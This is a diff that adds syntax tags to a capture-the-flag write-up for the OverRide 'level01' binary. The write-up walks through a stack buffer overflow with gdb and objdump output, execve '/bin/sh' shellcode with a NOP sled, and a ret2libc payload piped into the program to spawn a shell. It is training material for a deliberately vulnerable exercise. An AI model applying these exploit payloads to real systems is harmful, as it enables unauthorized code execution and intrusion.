@@ -1,5 +1,5 @@
 
-```
+```asm
 objdump -t level01 | grep bss
 0804a040 g     O .bss	00000064              a_user_name
 
@@ -8,7 +8,7 @@ objdump -t level01 | grep text
 08048464 g     F .text	0000003f              verify_user_name
 ```
 
-```
+```asm
 disass main
 
  0x0804852d <+93>:	call   0x8048464 <verify_user_name>
@@ -16,7 +16,7 @@ disass main
  0x08048580 <+176>:	call   0x80484a3 <verify_user_pass>
 ```
 
-```
+```asm
 disass verify_user_name
 
 0x0804847d <+25>:	mov    $0x80486a8,%eax
@@ -38,7 +38,7 @@ Desktop cyclic -l 0x61616175
 80
 ```
 
-```
+```asm
   0x08048580 <+176>:	call   0x80484a3 <verify_user_pass>
   0x08048585 <+181>:	mov    %eax,0x5c(%esp)
   
@@ -59,14 +59,14 @@ also u can use the syntax:
 `run < <(python -c 'print("dat_wil\nAAAA\n")')`
 `run < <(python -c 'print("dat_wil")' && python -c 'print("AAAA")')` / `run < <(python -c 'print "dat_wil"' && python -c 'print "AAAA"')`
 
-```
+```py
 run < <(python -c 'print "dat_will"' && python -c 'print "A" * 80 + "BBBB"')
 run < <(python -c 'print "dat_will\n" + "\x90" * 59 + "C" * 21 + "BBBB"')
 
 x $ebp+4
 0xffffd6ec:	0x42424242
 ```
-```
+```asm
 run < <(python -c 'print "dat_wil"' && python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90" * 59 +  "\xff\xff\xd6\x9c"[::-1]')
 
 
@@ -80,7 +80,7 @@ x *0xffffd6ec
 
 nothing
 
-```
+```asm
 ltrace ./level01
 
 puts("Enter Password: "Enter Password:
@@ -105,7 +105,7 @@ Architecture of file not recognized.
 ```
 
 i will go with ret2libc
-```
+```gdb
 (gdb) p &system
  0xf7e6aed0 
  
@@ -117,7 +117,7 @@ i will go with ret2libc
 (gdb) p &exit
  0xf7e5eb70 
  ```
- ```
+ ```gdb
 (gdb) find system, +9999999, "/bin/sh"
 0xf7f897ec
 
@@ -141,7 +141,7 @@ payload = padding + system + return_after_system + bin_sh
 
 `payload = "A" * 80 + "\xf7\xe6\xae\xd0"[::-1] + "AAAA" + "\xf7\xf8\x97\xec"[::-1]`
 
-```
+```py
 level01@OverRide:~$ (python -c 'print "dat_will\n" + "A" * 80 + "\xf7\xe6\xae\xd0"[::-1] + "AAAA" + "\xf7\xf8\x97\xec"[::-1]' ; cat) | ./level01
 ********* ADMIN LOGIN PROMPT *********
 Enter Username: verifying username....
